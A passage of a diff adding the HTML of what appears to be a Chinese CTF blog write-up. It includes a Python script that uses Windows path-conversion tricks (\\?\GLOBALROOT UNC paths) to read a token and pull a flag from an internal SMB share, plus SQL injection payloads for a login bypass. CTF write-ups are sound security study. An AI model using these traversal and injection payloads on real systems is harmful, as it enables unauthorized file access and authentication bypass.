+model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span>model_path<span class="token punctuation">,</span> `map_location<span class="token operator">=</span>torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">'cpu'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> weights_only<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>测试发现 Picklescan 会返回 Innocuous、 suspicious、dangerous</p>
+<hr>
+<h1 id="Path"><a href="#Path" class="headerlink" title="Path"></a>Path</h1><p>题目开头 <code>Win32 → NT Path Conversion Challenge</code></p>
+<p>可搜到： <a target="_blank" rel="noopener" href="https://projectzero.google/2016/02/the-definitive-guide-on-win32-to-nt.html">https://projectzero.google/2016/02/the-definitive-guide-on-win32-to-nt.html</a></p>
+<p>&#x2F;api&#x2F;info：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">"challenge"</span><span class="token operator">:</span> <span class="token string">"Path Maze"</span><span class="token punctuation">,</span>
+    <span class="token property">"hints"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Stage 1: Find and read the access token from the system"</span><span class="token punctuation">,</span>
+      <span class="token string">"Stage 2: Use the token to access the backup server"</span><span class="token punctuation">,</span>
+      <span class="token string">"Token location: C:\\token\\access_key.txt"</span><span class="token punctuation">,</span>
+      <span class="token string">"Backup server: 172.20.0.10"</span><span class="token punctuation">,</span>
+      <span class="token string">"Backup server SMB Share name: backup"</span><span class="token punctuation">,</span>
+      <span class="token string">"Flag file: flag.txt"</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token property">"stages"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
+    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后由于 token 每次获取只能用一次，写个脚本利用</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+
+url <span class="token operator">=</span> <span class="token string">"http://1.95.51.2:8080"</span>
+
+res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span>
+                    <span class="token string">'/api/diag/read?path=\\\\?\C:\\token\\access_key.txt'</span><span class="token punctuation">)</span>
+token <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res1<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">"\\\\?\\GLOBALROOT\\??\\UNC\\172.20.0.10\\backup\\flag.txt"</span>
+
+res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/api/export/read?path=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token operator">+</span>
+                    <span class="token string-interpolation"><span class="token string">f'&amp;token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<hr>
+<h1 id="safe-sql（Unsolved）"><a href="#safe-sql（Unsolved）" class="headerlink" title="safe-sql（Unsolved）"></a>safe-sql（Unsolved）</h1><p>引号均被 ban，直接转义实现闭合，测试发现注释符为 <code>-- </code></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时返回 <code>&#123;&quot;reason&quot;:&quot;No such user or wrong credentials.&quot;,&quot;status&quot;:&quot;failure&quot;&#125;</code></p>
+<p>然后如果没注释掉的话会返回 <code>&#123;&quot;reason&quot;:&quot;Something Error.&quot;,&quot;status&quot;:&quot;error&quot;&#125;</code></p>
+<p>那么可以尝试打布尔注入，测试发现只有 <code>CASE WHEN</code> 可用（不行），可以确定是老版本的 postgresql</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1\\"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or (CASE WHEN (1>0) THEN 1 ELSE 0 END)=1-- "</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
